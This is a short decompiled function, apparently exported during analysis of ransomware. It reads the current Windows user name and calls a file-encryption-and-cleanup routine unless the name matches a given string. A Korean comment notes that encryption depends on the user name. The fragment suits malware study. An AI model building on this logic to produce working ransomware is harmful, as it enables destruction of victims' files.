// --- Metadata ---
// Function Name: encryptIfTargetUser_100053F0
// Address: 0x100053F0
// Exported At: 20250522_122232
// Signature: unknown_signature
// ---------------
int __stdcall encryptIfTargetUser_100053F0(wchar_t *Format, wchar_t *String2, int a3)
{
  int result; // eax
  DWORD pcbBuffer; // [esp+4h] [ebp-204h] BYREF
  WCHAR Buffer; // [esp+8h] [ebp-200h] BYREF
  char v6[508]; // [esp+Ah] [ebp-1FEh] BYREF
  __int16 v7; // [esp+206h] [ebp-2h]

  Buffer = word_1000D918;
  memset(v6, 0, sizeof(v6));
  v7 = 0;
  pcbBuffer = 255;
  GetUserNameW(&Buffer, &pcbBuffer);            // 사용자 이름에 따라 암호화 수행 
  if ( wcsicmp(&Buffer, String2) )
    result = encryptAndCleanupFiles_100027F0((_DWORD *)a3, Format, 1);
  else
    result = 1;
  return result;
}
